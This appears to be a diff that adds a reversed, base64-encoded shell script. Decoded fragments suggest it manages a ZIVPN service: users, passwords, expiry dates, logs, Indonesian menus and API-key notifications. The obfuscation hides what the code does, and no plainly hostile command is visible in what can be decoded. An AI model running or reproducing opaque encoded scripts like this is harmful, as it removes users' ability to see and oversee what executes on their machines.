+wFGJiAibvlGdhNWamlGdv5WL5V2atkGchBCaz5iclBHblh2XuBndpp3LulmYvwWYj9GbvI3c19iC
+gsWd05WdgIXZ05WRg4WYrVGViACctACZhVmcKIibpFWbvRGJiAiIwl2XyVmdyV2ckICIikXZr9Va
+pd2bs9FduV3bjNWYfxWYpJHdfVGdhVmcj9FIu9Wa0Nmb1ZmC9pgIu4iL15WZtBSZrBSasFmYtV2a
+uMnclNXdv4Gc2lmevMGdl9iI9UGbpZ2XiRGIsF2YvxmCiEDJi0zclRXdulWbgwWYj9GbKsHIpgyY
+gojcvJncFJCIvh2YlpgblhGdgsTXdBCJr0VOtAzWeBif9AiIzVGd15WatRiIgs1WgECImlmCiIGZ
+0JSPkJ3b3N3chBHIsF2YvxmCpZmCxAibyVHdlJnCi4yclRXdulWbgY2bgIXZi1WduBCZpxWY25WS
+5JXawhXZKUGdhR2X5JXawhXZgwWYj9GbKISKxAibtASO5kTO50CMwADMxASatAiZ1h2coQCbhlmc
+kJ3b3N3chB3ekICIvh2YlpQKzVyKgIyclRXdulWbgMXZ0Vnbp1GJrICIk1CIlRXYkhCJ9UGdhR2X
+iQmcvd3czFGckICIzNXYwByZyFWLtAScqpgIlxWam9lYkRiIg4jPgISflRXYk9VeylGc4V2ekoTf
+vMGdl9CI+AibvNnaucWam52bj9ibwZXa69yY0V2LgcSXzNXYwRyWg0zKgcWam52bj5Ca0VXYucCI
+l9CIw1Gdu42bzpmLnlmZu92Yv4Gc2lmevMGdl9CI21GImYCIw1Gdu42bzpmLnlmZu92Yv4Gc2lme
+K4Gc2lmefRnchR3clJnCuVGa0ByOdBCMgEXZtAyPkAyWgYWaK42bzpmLnlmZu92Yv4Gc2lmevMGd
+pBHelRCQiACZtASZ0FGZoQSPEVEVUFUTS9kRfVkUJBFWFpARFRFVB1kUPZ0XFJVSQhVRgwWYj9Gb
+8BSZt5yZpZmbvNmZpByctACNtACbyV3YoQSPwlmCpISTloDSlASWlAiQlACZlIyKgISZ0FGZflnc
+y1CIxpGI8Bybp5ybm5WawlGIz1CIsJXdjhCJ9A3cppQKl1mLnlmZu92YmlGIz1CI20CIsJXdjBCf
+z5WZw9GKk0jTD9FVSV0QKkyJv8CIrwVX50CMbNVQe9ycnACZlNHI8ByJiE0LOJCIv8CInJ3bucCI
+u1CIkV2cgwHI0NWZqJWdz1CI0V3bv5WLgQncj5ibwZXa69ibwZXa69yY0V2Lg4WatASOwUDegw2c
+gIiTD9FVSV0QkICIbBiZppAdz9GagwWYj9GbKkyJw9SMc9iKukCXq0FLetFKcBSPg40Qq4yLzdCI
+gwmc1NGI8xHIl1mLnlmZu92YmlGIz1CI00CIsJXdjhCJ9Q3cvhmCuVGa0ByOdBiIuBndppnIg0TP
+jNWdTJCIvh2YlpgchVGbjpQampgTD9FVSV0Qk0Ddz9GaKU2csVmCpUWbucWam52bjZWagMXLgYTL
+ASp4ASp4ASp4ASp4ASp4ASp4MSp4iAyboNWZKIiTQZVSaBiTVtUQgwUQJJFViAyboNWZKIiOzNXZ
+QSp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4
+g8GajVmCiAXakAiOgACIgACUJBigUKuIg8GajVmCiQ3cvhGJgoDIgACdz9GSgIIliLCIvh2YlpgI
+iLCIvh2YlpgIkJ3b3N3chBHJgoDIgAyczFGUgIIliLCIvh2YlpgIwNXakAiOgACIgA1UJBigUKuI
+UKOgUKOgUKOgUKOgUKOgUKOlUKuIg8GajVmCiQURURVQNJ1TG9VRSlEUYVEJgoDIlJXawhXRgIIl
+UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg
+j9GbKISatF2ag4WYuFWehxGIuF2ah5Wdndmbl1GIoFGblRHIol2chtGIh1WayVGViAyboNWZKICm
+UKOgUKOgUKOgUKOgUKOjUKuCOBlVJpFIOV1SBBCTBlkUUpgRPVEP8ACdhNGKk0TZnF2czVWbgwWY
+UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg
+zlGJgoDIgACIQNVSgIIlirAcpRCI6ACIgACIQlEICSp4KQ3cvhGJgoDIgACdz9GSgIIlirAkUKOg
+irARFRFVB1kUPZ0XFJVSQhVRkAiOgUmcpBHeFBigUKuCkJ3b3N3chBHJgoDIgAyczFGUgIIlirAc
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliTJl
+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
+UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOlUKuIg8GajVmCiQWZ0VGblREI6Ayc1RXY0NFICSp4iAyb
+oNWZKICmUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg
+zVWbgwWYj9GbKISatF2ag4WYuFWehxGIuF2ah5Wdndmbl1GIoFGblRHIol2chtGIh1WayVGViAyb
+iDIliDIliDIliDIliDIliDIlizIlirgTQZVSaBiTVtUQgUEVFxUREpgRPVEP8ACdhNGKk0TZnF2c
+KAJliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+CSp4KA3cpRCI6ACIgACUTlEICSp4KAXakAiOgACIgACUJBigUKuC0N3boRCI6ACIgQ3cvhEICSp4
+iDIliDIliDIliDIliTJlirAZlRXZsVGRgoDIzVHdhR3UgIIlirAZy92dzNXYwRCI6ACIgM3chBFI
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+zpQKKY0TFpQatF2ag4WYuFWehxGIuF2ah5Wdndmbl1GIoFGblRHIol2chtGIh1WayVGVKgJliDIl
+gYWLg0mcKU2csVmCwAibyVHdlJnCiU2ZhN3cl1GJiAibvlGdhNWamlGdv52XtFmcnVGblR3Xk5WZ
+slWYGBiOy9mcyVkIg8GajVmClxWamBCctVGdgAXdg4WYlx2QgMCIiUGbpZ2XnlmZu92YfBXb0RiI
+xAibyVHdlJnCi4SZkFWbgUmcldHIzV2ZuFGajBybOBiLu92cq5yZpZmbvNGIlRXYkBXdg8GdgQWZ
+UKOgUKOgUKOgUKuIg8GajVmCyFWZsNmC7BSKoQnb192YjF2XlRXZsVGZg42bpR3YuVnZK0nCpZmC
+iDIliDIliDIliDIliDCduV3bjNWQgUGdlxWZEBCgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg
+BByIgIiIg8GajVmCzRnb192YjF2X5FGbwNXak9lCiAIliDIliDIliDIliDIliDIliDIliDIliDIl
+0BCZy92dzNXYwBiclRnbFJCIw1CIkFWZypwZul2YhB3cgIXZ0RXZiBicvZGIl5WasdXZuBSYgQGZ
+hBlIg8GajVmCuVGa0ByOdBiIkJ3b3N3chBHJiAietAyWgYWaKQmcvd3czFGcgICI6UGdlxWZkByb
+oQSP0xWdzVmcKQHb1NXZyBCbhN2bspQampgbyVHdlJnCi4Se0BXblBSZiBCdv5mbhNGIkJ3b3N3c
+sB3cpREIjAiI0xWdzVmckICIvh2YlpQKiQmcvd3czFGckICIjl2Zvx2X05WdvN2Yh9VZ0VGblR2X
+lRnbFBibhtWZUJCIw1CIkFWZypgbvlGdj5WdmByYpd2bsBSZoRHIt9mcmBCdsV3clJHIlhGdgkXY
+KsHIpgibpFWbvR2Xldmbhh2Yg42bpR3YuVnZK0nCi4iLuUnbl1GIltGIpxWYi1WZrBya1Rnb1Bic
+n5WYoNEIASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4iAyboNWZ
+ypgIASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4g4Wah12bEBSZ
+lRXYjlmZpRnclNGIMN1UgUGa0BicvZGIl1WYuBibpFWbvRGI3VmbgUGa0BiclRnbFJCIw1CIkFWZ
+hNGIl1WYuBibpFWbvRkIg8GajVmCuVGa0ByOdBiIulWYt9GZkICI61CIbBiZppgbpFWbvRGIiAiO
+0F2YpZWa0JXZjBydl5GIn5Wa0Fmcl5WZHJCIvh2YlpQampgbyVHdlJnCi4Se0BXblBSZiBCdv5mb
+hNncgkXZrdXZu1CI3VmbtASclJHIsN3cuVGcvpgIu4iLn0nbpFWbvR2ekcCIulWYt9GZgI3bmBSZ
+hlmby9mZpxWYD1DVT9yUV1zQvICIqJWdz1iCcBSOwUDetAyclR2bu1CI1YzMgMXehRWLgYTOwQjO
+pFWbvR2ek0jTD9CduVWb0JXYwVGRgQVS9U1TvAncvNEIlxGctFGeF1zTvMXZsV2ZuFEIz9GT9w0L
+2lmev4Gc2lmevMGdl9iIgQXdv1CIikXZr5ibwZXa69ibwZXa69yY0V2LiACd19WeltWLKwFIi0nb
+9pgbwZXa69FdyFGdzVmcKIiLkVGdhJXZuV2ZgUGdhNWamlGdyV2YgcXZOJCIvh2YlpgI0J3Yu4Gc
+uBndpp3LjRXZvISPlxWam9lYkBCbhN2bspwegkCKzJXZzV3XsFGdvR3XlZXYz9FIu9Wa0Nmb1ZmC
+iQHe05ycyV2c19FbhR3b09ibwZXa69yY0V2Li0TZslmZfRXdwRXdvBCbhN2bspgIiRmLzJXZzV3L
+vh2YlpgblhGdgsTXgISZslmZfJGZkICIz1CIhAyWgwHfg0FIiUGbpZ2XiRGJiAiZtASIgsFImlmC
+19FbhR3b0pwcyV2c19FbhR3b0BCbhN2bspQampgbyVHdlJnCiUGbpZ2X0VHc0V3bkICI+AiIwICI
+zJXZzV3XsFGdvRHJiAyboNWZKkyJgcCIk1CIyRHI8BiIlxWam9lYkRiIgwDIs1CIjdHKk0zcyV2c
+sF2YvxmC7BSKoMHduV3bjNWYflXYsB3cpR2Xg42bpR3YuVnZK0nCiUGbpZ2X0VHc0V3bkICI+AiI
+gwHfg0FIiUGbpZ2XiRGJiAiZtASIgsFImlmCiIGZuMnclNXdv4Gc2lmevMGdl9iI9UGbpZ2XiRGI
+yVHdlJnCi4CZuV3bmByc05WdvN2YhBybOJCIvh2YlpgblhGdgsTXgISZslmZfJGZkICIz1CIhAyW
+iAiZ05WayBnCpMXJrASZ0FGZoQSPlRXYk9FduVmcyV3YKUGdhR2X05WZyJXdjBCbhN2bspQampgb
+iDIliLCIvh2YlpgIpMXehRGKg4WagMXZylGc4VkIgICZy92dzNXYQJCIi4GXzVCICSp4gMHMy0SJ
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+K8GZgsTZ0FGZflncpBHelBCZy92dzNXYwBictACZhVmcgciOn0zUGlEIlxWaodnCiAIliDIliDIl
+ogCJ9MHZu92YlN3Xn5WaulWYtVmcgwWYj9GbK4WZoRHI70VXgICZy92dzNXYwRiIg4WLgs1WgYWa
+gQ3ZtAyck52bjV2cfdmbp5Wah1WZyRCIbBiZppQKpUGdhR2X05WZyJXdjBSLgUGdhR2X5JXawhXZ
+0YDOg8CIzRmbvNWZz91ZulmbpFWblJHKoQSPzlXYk91ZulmbpFWblJHIsF2YvxmCuVGa0ByOdBCM
+n5WaulWYtVmckICIiQmcvd3czFGckICIi4GXzlXYkByclAigUKOIzBjMtUiIgYGdulmcwpQKpADM
+mpQampgIkJ3b3N3chBHJiAiIuxFZlJXawhXRgIIliDycwITLlICImRnbpJHcKU2csVmCiMXehR2X
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliLCIvh2YlpgIlxWam9lYkRiIgwDIl52bkpQa
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+h9FdzlGbg42bpR3YuVnZK0nCiAIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4iAyboNWZKIXYlx2YKsHIpgyc05WdvN2Y
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDyc05WdvN2YBBSZ2lGdjFEIASp4
+gIXZ0RXZiBicvZGIl5WasdXZuBSYgQGZBByIgIiIg8GajVmCzRnb192YjF2X5FGbwNXak9lCiAIl
+K0nCi4iLuUnbl1GIlhGdg8Gdg4mc1RXZyByb0BiclRnbFByczVmcQJCIw1CIkFWZypwZul2YhB3c
+rRiIgs1WgECImlmCxQSPil2agwWYj9GbKsHIpgibh1Wdo91b09lYpt2X0FWby9mZg42bpR3YuVnZ
+iAyWgYWaKkmZKATPil2aK4WZoRHI70FIiIWarRiIgoXLgsFI8xHId1FIksSX50CMb5FI+1DIiIWa
+ulmcwByeg4USHVkQnAiIil2akISPsFmdgYXLgs2dhpgblhGdgsTXgYzN1gDNwEDI0xWLgIiYptGJ
+JdURCdCIiIWarRiI9wWY2BidtAya3FmClNHblpwJ9BCNyATMg8CIsFmdgwiIClWTgYmMuUiIgYGd
+0V2Zg42bpR3YuVnZK0nCpZmCn0HI2cTN4QDMxAyLgwWY2BCLiIUaHBiZy4SJiAiZ05WayBHI7BiT
+gs2dhBCfgQHb1FmZlRGIvRHI39GazBSZ0V3byBCNtAybtACcppwegkCKlNWYmJXZ05Waf5Wah12X
+KsHIpgCbl5WYw91bm5WafdXYyR2Xg42bpR3YuVnZK0nCxAibtACZhVGagwHIn0XNkACdulmcwt3J
+052bt91diBSehR2b091diBybm5WafR3cvhGIvZmbp9FcpBybm5WafB3cpBybm5WafN3bgwWYj9Gb
+vYXZk9iPyACb0NWZtFmb0N3bohCIoQSPvZmbp91cvpAc4V2XlNnblNWasBSZtFmbfRnbllGbjBCa
+gslXvM3JgQWZzBCfgIjZtAiOk1CI0V3YgwHIi0WZ0NXeTByZulGdhJXZw9kIgAXZydGI8BCbsVnb
+gwWYj9GbK0nIB9iTi0iOvZmbp91cvtHJ98mZul2Xz9mCpAiIB9iTiAyboNWZgwHfgkyJv8iKdRHX
+fBXakICIvh2YlhCJ98mZul2XwlmCp8Wau8mZulGcpByctACbyV3YoQSPhRXYk9FcppQY0FGZfBXa
+gISY0FGZfBXakICIvh2YlhCJ98mZul2XwNXaKkyJiE0LOJCIv8CIwlmLnAictAScqBCfgISY0FGZ
+98mZul2XwlmCpcyLvAyKc1VOtAzWTFkXvM3JgQWZzBCfgciIB9iTiAyLvAyZy9mLnAictAScqBCf
+fRlUFNEIsF2YvxmC9JSQv4kItozbm5WafB3cptHJ98mZul2XwNXaK0nIB9iTi0iOvZmbp9FcptHJ
+0V3bv5WLgQncj5ibwZXa69ibwZXa69yY0V2Lg4WatASOwUDegw2cz5WZw9GKk0jTD9FVSV0QK40Q
+sVnbvYXZk9iPyAyJw9SMc9iKukCXq0FLetFKcBSPg40Qq4yLzdCIu1CIkV2cgwHI0NWZqJWdz1CI
+UJVRDRiIgoXLgsFI8xHIdBiIuBndppnIg0TPgIiTD9FVSV0QkICIbBiZppQKiICIvh2YlBCf8BCb
+mpgTD9FVSV0Qk0zbm5WafR3cvhmClNHblpwbm5WafBXak0zbm5WafR3cvhmCuVGa0ByOdBiION0X
+iACclJ3ZgwHI1B3YzxGKk0TZtFmbfVHcjpQfiE0LOJSL68mZul2X0N3botHJ98mZul2X0N3bopQa
+9MXZy92YfVHcjpQKn8yLq0FdcByWe9ycnACZlNHI8BiMm1CI6QWLgQXdjBCfgISZtFmbgwWZk9WT
+tpQKn0nMkACdulmcwtHIvoTbl10LnAya3FGI8BCatASZlJnZoQSPsFGdvR3XtVWbKkyYvJHcuhCJ
